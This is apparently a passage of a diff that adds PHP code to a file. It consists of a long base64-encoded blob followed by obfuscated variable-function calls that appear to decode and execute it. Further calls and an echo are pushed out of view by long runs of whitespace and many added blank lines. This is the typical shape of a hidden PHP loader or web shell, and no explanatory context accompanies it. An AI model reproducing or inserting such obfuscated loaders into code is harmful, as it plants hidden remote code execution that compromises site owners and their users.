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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
